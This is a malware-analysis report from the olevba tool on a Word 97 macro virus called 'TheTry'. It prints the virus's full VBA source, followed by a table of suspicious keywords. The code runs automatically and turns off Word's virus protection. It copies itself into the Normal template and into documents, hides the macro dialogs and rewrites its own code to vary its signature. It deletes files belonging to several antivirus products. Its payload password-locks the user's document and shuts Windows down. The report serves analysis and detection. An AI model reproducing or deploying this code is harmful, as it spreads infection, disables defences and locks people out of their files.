olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Dmv.e.dam-80e04602430b9184e6d66931a65e0dafc7402bbeb3069a26faea9084bbcbd237
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Dmv.e.dam-80e04602430b9184e6d66931a65e0dafc7402bbeb3069a26faea9084bbcbd237 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Generated by DarkChasm's Word 97 Macro Virus Construction Kit (DW97MVCK)
'Virus Name: TheTry


'------------------------------------------------------------
'AutoOpen macro
'Executed when a document is opened
'------------------------------------------------------------
Sub AutoOpen()
  On Error GoTo TheTry

  Payload

  Mutate

  Application.ScreenUpdating = False
  Application.DisplayAlerts = wdAlertsNone

  WordBasic.DisableAutoMacros 0
  Options.VirusProtection = False

  Set GlobalDoc = NormalTemplate
  Set ActiveDoc = ActiveDocument

  GlobalInstalled = No
  DocumentInstalled = No

  For j = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(j).Name = "TheTry" Then
      GlobalInstalled = Yes
    End If
  Next

  For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(i).Name = "TheTry" Then
      DocumentInstalled = Yes
    End If
  Next

  If GlobalInstalled = No Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="TheTry", Object:=wdOrganizerObjectProjectItems
    Options.SaveNormalPrompt = False
  End If

  If DocumentInstalled = No Then
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="TheTry", Object:=wdOrganizerObjectProjectItems
      ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
  End If

  Application.DisplayAlerts = wdAlertsAll

  Retro

TheTry:
End Sub


'------------------------------------------------------------
'AutoClose macro
'Executed when a document is closed
'------------------------------------------------------------
Sub AutoClose()
  On Error GoTo TheTry

  Payload

  Mutate

  Application.ScreenUpdating = False
  Application.DisplayAlerts = wdAlertsNone

  WordBasic.DisableAutoMacros 0
  Options.VirusProtection = False

  Set GlobalDoc = NormalTemplate
  Set ActiveDoc = ActiveDocument

  GlobalInstalled = No
  DocumentInstalled = No

  For j = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(j).Name = "TheTry" Then
      GlobalInstalled = Yes
    End If
  Next

  For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(i).Name = "TheTry" Then
      DocumentInstalled = Yes
    End If
  Next

  If GlobalInstalled = No Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="TheTry", Object:=wdOrganizerObjectProjectItems
    Options.SaveNormalPrompt = False
  End If

  If DocumentInstalled = No Then
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="TheTry", Object:=wdOrganizerObjectProjectItems
      ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
  End If

  Application.DisplayAlerts = wdAlertsAll

  Retro

TheTry:
End Sub


'------------------------------------------------------------
'FileSave macro
'Executed when a user selects File Save from the Word menu
'------------------------------------------------------------
Sub FileSave()

  ActiveDocument.Save

  On Error GoTo TheTry

  Payload

  Mutate

  Application.ScreenUpdating = False
  Application.DisplayAlerts = wdAlertsNone

  WordBasic.DisableAutoMacros 0
  Options.VirusProtection = False

  Set GlobalDoc = NormalTemplate
  Set ActiveDoc = ActiveDocument

  GlobalInstalled = No
  DocumentInstalled = No

  For j = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(j).Name = "TheTry" Then
      GlobalInstalled = Yes
    End If
  Next

  For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(i).Name = "TheTry" Then
      DocumentInstalled = Yes
    End If
  Next

  If GlobalInstalled = No Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="TheTry", Object:=wdOrganizerObjectProjectItems
    Options.SaveNormalPrompt = False
  End If

  If DocumentInstalled = No Then
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="TheTry", Object:=wdOrganizerObjectProjectItems
      ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
  End If

  Application.DisplayAlerts = wdAlertsAll

  Retro

TheTry:
End Sub


'------------------------------------------------------------
'ToolsWordCount macro
'Executed when a user selects Tools WordCount
'------------------------------------------------------------
Sub ToolsWordCount()

  Dialogs(wdDialogToolsWordCount).Show

  On Error GoTo TheTry

  Payload

  Mutate

  Application.ScreenUpdating = False
  Application.DisplayAlerts = wdAlertsNone

  WordBasic.DisableAutoMacros 0
  Options.VirusProtection = False

  Set GlobalDoc = NormalTemplate
  Set ActiveDoc = ActiveDocument

  GlobalInstalled = No
  DocumentInstalled = No

  For j = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(j).Name = "TheTry" Then
      GlobalInstalled = Yes
    End If
  Next

  For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(i).Name = "TheTry" Then
      DocumentInstalled = Yes
    End If
  Next

  If GlobalInstalled = No Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="TheTry", Object:=wdOrganizerObjectProjectItems
    Options.SaveNormalPrompt = False
  End If

  If DocumentInstalled = No Then
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="TheTry", Object:=wdOrganizerObjectProjectItems
  End If

  Application.DisplayAlerts = wdAlertsAll

  Retro

TheTry:
End Sub


'------------------------------------------------------------
'ToolsMacro macro
'Used to hide the ToolsMacro dialog box
'------------------------------------------------------------
Sub ToolsMacro()

End Sub


'------------------------------------------------------------
'ViewVBCode macro
'Used to hide the ViewVBCode dialog box
'------------------------------------------------------------
Sub ViewVBCode()

End Sub


'------------------------------------------------------------
'ToolsCustomize macro
'Used to hide the ToolsCustomize dialog box
'------------------------------------------------------------
Sub ToolsCustomize()

End Sub


'------------------------------------------------------------
'FileTemplates macro
'Used to hide the FileTemplates dialog box
'------------------------------------------------------------
Sub FileTemplates()

End Sub


'------------------------------------------------------------
'Mutate macro
'Inserts random comments into the virus
'------------------------------------------------------------
Sub Mutate()
  On Error Resume Next

  Application.ScreenUpdating = False

  Set Current = MacroContainer

  For Grow = 1 To 20
    Number = Current.VBProject.VBComponents("TheTry").CodeModule.ProcCountLines("Mutate", vbext_pk_Proc)
      RandomLine = Int(Rnd() * Number + 1)
      RemarkLength = Int(Rnd() * 40 + 1)

        For Length = 1 To RemarkLength
          Remark = Remark + Chr$(Int((90 - 65 + 1) * Rnd + 65))
        Next Length

      Current.VBProject.VBComponents("TheTry").CodeModule.InsertLines RandomLine, vbTab & "Rem " & Remark
      Remark = ""

  Next Grow

End Sub


'------------------------------------------------------------
'Retro macro
'Deletes some popular AV programs
'------------------------------------------------------------
Sub Retro()
  On Error Resume Next
  Kill "C:\Program Files\AntiViral Toolkit Pro\Avp32.exe"
  Kill "C:\progra~1\Antivi~1\Avp32.exe"
  Kill "C:\Program Files\AntiViral Toolkit Pro\*.avc"
  Kill "C:\progra~1\antivi~1\*.avc"
  Kill "C:\f-macro\f-macro.exe"
  Kill "C:\f-prot~1\f-macro.exe"
  Kill "C:\Program Files\Command Software\F-PROT95\Sign.def"
  Kill "C:\progra~1\comman~1\f-prot95\sign.def"
  Kill "C:\Program Files\Command Software\F-PROT95\Dvp.vxd"
  Kill "C:\progra~1\comman~1\f-prot95\dvp.vxd"
  Kill "C:\Program Files\McAfee\VirusScan95\Scan.dat"
  Kill "C:\progra~1\mcafee\viruss~1\scan.dat"
  Kill "C:\Program Files\McAfee\VirusScan95\Mcscan32.dll"
  Kill "C:\progra~1\mcafee\viruss~1\mcscan32.dll"
  Kill "C:\Program Files\McAfee\VirusScan\Scan.dat"
  Kill "C:\Program Files\McAfee\VirusScan\Mcscan32.dll"
  Kill "C:\Program Files\Norton AntiVirus\Viruscan.dat"
  Kill "C:\progra~1\norton~1\viruscan.dat"
  Kill "C:\Program Files\Symantec\Symevnt.386"
  Kill "C:\progra~1\symantec\symevnt.386"
  Kill "C:\PC-Cillin 95\Scan32.dll"
  Kill "c:\pc-cil~1\*.dll"
  Kill "C:\PC-Cillin 95\Lpt$vpn.*"
  Kill "C:\PC-Cillin 97\Scan32.dll"
  Kill "C:\PC-Cillin 97\Lpt$vpn.*"
  Kill "C:\Tsc\PC-Cillin 97\Scan32.dll"
  Kill "c:\tsc\pc-cil~1\*.dll"
  Kill "C:\Tsc\PC-Cillin 97\Lpt$vpn.*"
  Kill "C:\TBAVW95\Tbscan.sig"
  Kill "c:\Tbavw95\Tb*.*"
  Kill "C:\Tbavw95\Tbavw95.vxd"
End Sub


'------------------------------------------------------------
'Payload macro
'Annoys the user
'------------------------------------------------------------
Sub Payload()
  On Error Resume Next
  MsgBox "Hi guys! As I have promised, it is my second virus, written with a mvck. It is the TRY! And it seems, that the next, third virus will be only my own!! Oh... Anyway I'm the Hungarian Black Cat! You'd better to visit my site: HTTP://BLACKCAT.WEB-PAGE.NET! This virus is not destructive, just a bit annoying! Before I don't forget... The password for your documents are: 'blackcat'! Don't forget! Next time I won't be so kind! So that's all for today, have fun. And hope I don't disturb your work! Work more! ", vbOKOnly, "VIRUS!!!!!!!!!!"

  ActiveDocument.Password = "blackcat"
  ActiveDocument.Save

  Tasks.ExitWindows

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Avp32.exe           |Executable file name                         |
|IOC       |macro.exe           |Executable file name                         |
|IOC       |Mcscan32.dll        |Executable file name                         |
|IOC       |mcscan32.dll        |Executable file name                         |
|IOC       |Scan32.dll          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

